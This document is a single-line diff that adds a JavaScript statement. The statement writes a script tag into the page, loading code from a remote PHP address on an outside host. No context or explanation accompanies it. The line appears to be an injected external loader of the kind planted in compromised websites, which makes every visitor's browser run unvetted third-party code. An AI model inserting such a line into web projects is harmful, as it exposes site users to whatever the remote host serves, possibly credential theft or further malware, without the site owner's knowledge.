@@ -1,0 +1,1 @@
+document.writeln("<script type=\'text/javascript\' src=\'http://dk189591.51host.net/9526.php\'></script>");
